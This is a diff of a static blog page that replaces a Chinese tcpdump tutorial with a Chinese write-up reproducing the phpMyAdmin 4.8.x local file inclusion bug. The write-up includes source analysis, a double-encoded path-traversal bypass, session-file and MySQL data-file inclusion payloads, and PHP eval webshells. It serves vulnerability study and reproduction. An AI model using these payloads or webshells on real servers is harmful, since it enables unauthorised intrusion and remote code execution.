@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>kali渗透测试之Web渗透-工具-TCPDUMP | Mang0&#39;s blog</title>
-  <meta name="keywords" content=" TCPDUMP ">
-  <meta name="description" content="kali渗透测试之Web渗透-工具-TCPDUMP | Mang0&#39;s blog">
+  <title>phpMyAdmin 4.8.x 本地文件包含 | Mang0&#39;s blog</title>
+  <meta name="keywords" content=" 复现 ">
+  <meta name="description" content="phpMyAdmin 4.8.x 本地文件包含 | Mang0&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
 <meta property="og:type" content="website">
@@ -670,9 +670,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-kali渗透测试之Web渗透-工具-TCPDUMP" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-phpMyAdmin-4-8-x-本地文件包含" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">kali渗透测试之Web渗透-工具-TCPDUMP</h1>
+        <h1 class="article-title">phpMyAdmin 4.8.x 本地文件包含</h1>
     
     <div class="article-meta">
         
@@ -680,26 +680,26 @@
         
         <span class="book">
             
-            <a href="javascript:" data-rel="Kali">Kali</a>
+            <a href="javascript:" data-rel="WebSecurity">WebSecurity</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">TCPDUMP</a>
+            <a href="javascript:" class="color3">复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-15 08:40:51'>2018-02-27 19:42</time>
+        创建时间:<time class="date" title='更新时间: 2018-10-27 22:32:15'>2018-10-27 22:19</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1,470</span>
+        <span>字数:1,055</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -729,7 +729,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TCPDUMP-抓包、筛选、高级筛选、过程文档记录"><span class="toc-text">TCPDUMP-抓包、筛选、高级筛选、过程文档记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCPdump—–抓包"><span class="toc-text">TCPdump—–抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#选项介绍"><span class="toc-text">选项介绍</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-源码分析"><span class="toc-text">0x00 源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-漏洞复现"><span class="toc-text">0x01 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞利用"><span class="toc-text">0x02 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考文章漏洞细节"><span class="toc-text">0x03 参考文章漏洞细节</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -744,127 +744,87 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#kali渗透测试之Web渗透-工具-TCPDUMP</p>
-<h2 id="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"><a href="#TCPDUMP-抓包、筛选、高级筛选、过程文档记录" class="headerlink" title="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"></a>TCPDUMP-抓包、筛选、高级筛选、过程文档记录</h2><p>TCPDUMP</p>
-<p>  No-GUI的抓包分析工具</p>
-<p>  Linux、Unix系统默认安装</p>
-<h3 id="TCPdump—–抓包"><a href="#TCPdump—–抓包" class="headerlink" title="TCPdump—–抓包"></a>TCPdump—–抓包</h3><p>抓包</p>
-<p>  默认只抓68个字节</p>
-<p>  指定端口 -s0指定包有多大就抓多大<br>  tcpdump -i eth0 -s 0 -w file.pcap</p>
-<p>  tcpdump -i eth0 port 22</p>
-<p>读取抓包文件</p>
-<p>  Tcpdump -r file.pcap</p>
-<h3 id="选项介绍"><a href="#选项介绍" class="headerlink" title="选项介绍"></a>选项介绍</h3><p>-A 以ASCII格式打印出所有分组，并将链路层的头最小化。 </p>
-<p>-c 在收到指定的数量的分组后，tcpdump就会停止。 </p>
-<p>-C 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size 中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size 的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。 </p>
-<p>-d 将匹配信息包的代码以人们能够理解的汇编格式给出。 </p>
-<p>-dd 将匹配信息包的代码以c语言程序段的格式给出。 </p>
-<p>-ddd 将匹配信息包的代码以十进制的形式给出。 </p>
-<p>-D 打印出系统中所有可以用tcpdump截包的网络接口。 </p>
-<p>-e 在输出行打印出数据链路层的头部信息。 </p>
-<p>-E 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。 </p>
-<p>-f 将外部的Internet地址以数字的形式打印出来。 </p>
-<p>-F 从指定的文件中读取表达式，忽略命令行中给出的表达式。 </p>
-<p>-i 指定监听的网络接口。 </p>
-<p>-l 使标准输出变为缓冲行形式，可以把数据导出到文件。 </p>
-<p>-L 列出网络接口的已知数据链路。 </p>
-<p>-m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。 </p>
-<p>-M 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。 </p>
-<p>-b 在数据-链路层上选择协议，包括ip、arp、rarp、ipx都是这一层的。</p>
-<p>-n 不把网络地址转换成名字。</p>
-<p>-nn 不进行端口名称的转换。</p>
-<p>-N 不输出主机名中的域名部分。例如，‘nic.ddn.mil‘只输出’nic‘。 </p>
-<p>-t 在输出的每一行不打印时间戳。 </p>
-<p>-O 不运行分组分组匹配（packet-matching）代码优化程序。 </p>
-<p>-P 不将网络接口设置成混杂模式。 </p>
-<p>-q 快速输出。只输出较少的协议信息。 </p>
-<p>-r 从指定的文件中读取包(这些包一般通过-w选项产生)。 </p>
-<p>-S 将tcp的序列号以绝对值形式输出，而不是相对值。 </p>
-<p>-s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 </p>
-<p>-T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。 </p>
-<p>-t 不在每一行中输出时间戳。 </p>
-<p>-tt 在每一行中输出非格式化的时间戳。 </p>
-<p>-ttt 输出本行和前面一行之间的时间差。 </p>
-<p>-tttt 在每一行中输出由date处理的默认格式的时间戳。 </p>
-<p>-u 输出未解码的NFS句柄。 </p>
-<p>-v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。 </p>
-<p>-vv 输出详细的报文信息。 </p>
-<p>-w 直接将分组写入文件中，而不是不分析并打印出来。</p>
-<p>root:～# tcpdump -h          </p>
-<pre><code> enter code here
-tcpdump version 4.3.0
-libpcap version 1.3.0
-
-Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ]
-
-
-[ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds]
-
-             [ -i interface ] [ -j tstamptype ] [ -M secret ]
-
-             [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ]
-
-             [ -W filecount ] [ -y datalinktype] [ -z command ]
-
-             [ -Z user ] [ expression ]
-</code></pre><p>root:～# tcpdump -i eth0 -s 0 -w a.cap     //监听网络接口字节为0保存到a.cap文件中</p>
-<p>tcpdump: listening on eth0, link-type EN10MB(Ethernet), capture size 65535 bytes</p>
-<p>^C15 packets captured</p>
-<p>15 packets receiced by filter</p>
-<p>0 packets drodded by kernel</p>
-<p>root:～# tcpdump -r a.cap                  //读取a.cap文件内容</p>
-<p>root:～# tcpdump -A -r a.cap               //以ASCII格式打印出所有的分组并且读取此文件</p>
-<p>root:～# tcpdump -X -r a.cap               //以十六进制格式打印出所有的分组并且读取此文件</p>
-<p>root:～# tcpdump -i eth0 tcp port 22</p>
-<p>TCPDUMP——筛选</p>
-<p>  tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p>
-<p>  tcpdump -n src host 145.254.160.237 -r http.cap</p>
-<p>  tcpdump -n dst host 145.254.160.237 -r http.cap</p>
-<p>  tcpdump -n port 53 -r http.cap</p>
-<p>  tcpdump -nX port 80 -r http.cap</p>
-<p>root:～/Downloads# tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p>
-<p>reading from file http.cap, link type En10MB(Ethernet)</p>
-<p>145.253.2.203.53</p>
-<p>145.254.160.237.3009</p>
-<p>145.254.160.237.3371</p>
-<p>145.254.160.237.3372</p>
-<p>216.239.59.99.80</p>
-<p>65.208.228.223.80</p>
-<p>0                  1                    2                   3</p>
-<p>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</p>
-<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
-<p>|          Source Port          |     Destination Port          |       </p>
-<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
-<p>|                        Sequence Number                        |         </p>
-<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
-<p>|                      Acknowledgment Nuber                     |         </p>
-<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
-<p>|  Date  |      |C|E|U|A|P|R|A|F|                               |</p>
-<p>| Offset |  Res.|W|C|R|C|S|S|Y|I|         Windwos               |</p>
-<p>|        |      |R|E|G|K|H|T|N|N|                               |         </p>
-<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
-<p>|            Checksum           |     Urgent Pointer            |         </p>
-<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
-<p>|                      Options               |     Padding      |         </p>
-<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
-<p>|                                data                           |          </p>
-<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
-<p>CEUAPRSF</p>
-<p>00011000 = 24 in decimal</p>
-<p>TCPDUMP——高级筛选</p>
-<p>  tcpdump -A -n ‘tcp[13]=24’ -r http.cap</p>
-<p>过程文档记录</p>
-<p>  Dradis</p>
-<pre><code>短期临时小团队资源共享
-
-各种插件导入文件
-</code></pre><p>  keepnote</p>
-<p>  Truecrypt</p>
-<p>应用程序—–&gt;报告工具库—–&gt;Documentation—–&gt;dradis</p>
-<p>应用程序—–&gt;Office—–&gt;KeepNote</p>
-<p>New Notebook</p>
-<p>新建一个keepnote</p>
-<p>TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持FAT32和NTFS分区、隐藏卷标、热键启动等。</p>
+        <h2 id="0x00-源码分析"><a href="#0x00-源码分析" class="headerlink" title="0x00 源码分析"></a>0x00 源码分析</h2><p>在/index.php     56行：</p>
+<p><img src="" alt="img"></p>
+<p>这里的target 可以直接传值输入。我们可以传入一个本地文件路径去让其包含，就会造成LFI漏洞。</p>
+<p>首先，我们满足4个条件：</p>
+<p>1．传入的target 需要是一个字符串。</p>
+<p>2．不能以/index/ 开头。</p>
+<p>3．不能在$target_blacklist数组内。</p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\052347bd2743c4b4c356996d842359de.png" alt="img"></p>
+<p>4．满足checkPageValidity函数要求。</p>
+<p>跟踪一下checkPageValidity函数</p>
+<p>在/libraries/classes/Core.php  443行:</p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\715e352918c11a7e8029bb2d9a897fe6.png" alt="img"></p>
+<p>该函数内，有三处返回ture的地方，只要有任意一处返回ture就可以。观察这三处，有一个共同点，都是需要$page在$whitelist数组中内才会返回true。</p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\84f51699726302cc72be152d425b380b.png" alt="img"></p>
+<p>我们先看第一个返回true的地方。</p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\bae25cd9638b29f7e362378fd4bffd41.png" alt="img"></p>
+<p>这里的$page在in_array之前没有经过任何的修饰，直接就与$whitelist作比较。没有办法绕过，传入的target值只能为白名单里的文件名才行。很明显，第一个并不能利用。</p>
+<p>再来看第二个</p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\7b3e77822c7d3ac4142d3725aaa69bb8.png" alt="img"></p>
+<p>先介绍下这些函数的作用：</p>
+<p>mb_strpos()函数的意思是查找字符串在另一个字符串中首次出现的位置。</p>
+<p>mb_substr()函数的意思是：</p>
+<pre><code>string mb_substr ( string $str, int $start [, int $length = NULL [, string $encoding = mb_internal_encoding()]] )
+</code></pre><p>从$str字符串中，提取从$start位置开始，长度为$length的字符串。</p>
+<p>可以看出，第二个可以返回ture，我们利用db_sql.php?/../../格式就可以达到目的，绕过白名单限制。那是不是这样就可以造成漏洞了呢？</p>
+<p>假设我们用db_sql.php?/../../../aaa.txt来绕过白名单限制进行包含文件。</p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\7c62ac55d4b22ce97d63800033f14835.png" alt="img"></p>
+<p>那这里就是 include ‘db_sql.php?/../../../aaa.txt’。</p>
+<p>这种格式并不能跨路径包含，因为php程序把？号后面的东西当成是传入db_sql.php文件的参数。</p>
+<p>再来看第三个：</p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\84beb310c9f8c555ea6fb71e0698f371.png" alt="img"></p>
+<p>第三个和第二个对比多出了个urldecode()函数。</p>
+<p>而问题恰恰出在了这个urldecode()函数。</p>
+<p>我们可以利用双重编码绕过，将?经过两次编码%253f就可以绕过白名单验证。</p>
+<p>原因是：</p>
+<p>%253f 传入时，首先会被自动解码一次，变成%3f。然后urldecode()再解码一次，就变成了 ?。 成功绕过了白名单限制。</p>
+<p>这种情况下include的包含情况就是这样的，也就可以任意包含本地文件了。</p>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>1.使用帐号 root ，密码 toor 登录 phpMyAdmin</p>
+<p>2.点击顶部导航栏中的SQL按钮，执行SQL查询</p>
+<pre><code class="sql">select &#39;&lt;?php phpinfo();exit;?&gt;&#39;
+</code></pre>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\exp_5.png" alt="VulnSpy"></p>
+<ol>
+<li>获取自己的SESSION ID</li>
+</ol>
+<p>你的 SESSION ID 为 Cookie 中的 <code>phpMyAdmin</code> 项。</p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\exp_6.png" alt="VulnSpy"></p>
+<p>这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p>
+<ol>
+<li>包含SESSION文件，成功利用该漏洞</li>
+</ol>
+<pre><code class="bash">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k
+</code></pre>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\exp_7.png" alt="VulnSpy"></p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>将WebShell写入到数据库中然后包含数据库文件，这个方法需要写入数据的权限。</p>
+<p>在phpmyadmin中插入马的字段。比如 <code>&lt;?php eval($_GET[a])?&gt;</code></p>
+<p>此时，如果mysql的路径被猜到的话，其实是可以知道该表中所存储的数据的。</p>
+<pre><code class="vim">?a=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../var/lib/mysql/test/HACK.ibd
+</code></pre>
+<p>我不知道应该是ibd还是frm文件，但是最终发现这样会出错，猜测可能是字符编码的问题或者是mysql版本的问题。我mysql的版本比较高。可能数据文件不是这么好读取。</p>
+<p>方法二：利用mysql的data文件：</p>
+<p>不用写文件也能拿Shell的方法。</p>
+<p>我们都知道，登入phpmyadmin后，数据库就是完全可以控制的了，那我们是否可以把WebShell写入到数据库中然后包含数据库文件</p>
+<p>创建一个名为abc的表，并且字段设置为</p>
+<pre><code>&lt;?php eval($_GET[‘z’]); ?&gt;。
+</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\0b17b8f7210a3d7894dca01435cfe609.png" alt="img"></p>
+<p>保存，然后会在\MySQL\data\test目录下生成三个以数据表名命名的文件。（test为数据库名称）。</p>
+<p>如果你不知道data文件路径，可以用sql查询来获取到它的绝对路径。</p>
+<pre><code>show variables like &#39;%datadir%&#39;;
+</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\b071d225a03774b04f057f324a390a17.png" alt="img"></p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\2101ec2bbe439ab48a8ac574c16e189e.png" alt="img"></p>
+<p>其中，abc.frm文件内容</p>
+<p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\2debae539b0d4aea4aef11dddf6af7b0.png" alt="img"></p>
+<p>Payload：</p>
+<pre><code>/index.php?z=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../ruanjian/phpstudy/PHPTutorial/
+MySQL/data/test/abc.frm
+</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\bebfd31b0d63a338eee12cda98393928.png" alt="img"></p>
+<p>方法三：包含本地系统文件</p>
+<p>Payload:</p>
+<pre><code>/index.php?target=db_sql.php%253f/../../../../../../windows/system.ini
+</code></pre><h2 id="0x03-参考文章漏洞细节"><a href="#0x03-参考文章漏洞细节" class="headerlink" title="0x03 参考文章漏洞细节"></a>0x03 参考文章漏洞细节</h2><p>参照ChaMd5安全团队发布的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">phpmyadmin4.8.1后台getshell</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 951207194@qq.com </span>
@@ -878,12 +838,12 @@ Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ]
 
 
 <div class="article_copyright">
-    <p><span>文章标题:</span>kali渗透测试之Web渗透-工具-TCPDUMP</p>
-    <p><span>文章字数:</span><span class="post-count">1,470</span></p>
+    <p><span>文章标题:</span>phpMyAdmin 4.8.x 本地文件包含</p>
+    <p><span>文章字数:</span><span class="post-count">1,055</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
-    <p><span>发布时间:</span>2018-02-27, 19:42:43</p>
-    <p><span>最后更新:</span>2018-10-15, 08:40:51</p>
-    <span>原始链接:</span><a class="post-url" href="/archives/2b646ba1/" title="kali渗透测试之Web渗透-工具-TCPDUMP">http://mang0.me/archives/2b646ba1/</a>
+    <p><span>发布时间:</span>2018-10-27, 22:19:37</p>
+    <p><span>最后更新:</span>2018-10-27, 22:32:15</p>
+    <span>原始链接:</span><a class="post-url" href="/archives/767136e1/" title="phpMyAdmin 4.8.x 本地文件包含">http://mang0.me/archives/767136e1/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
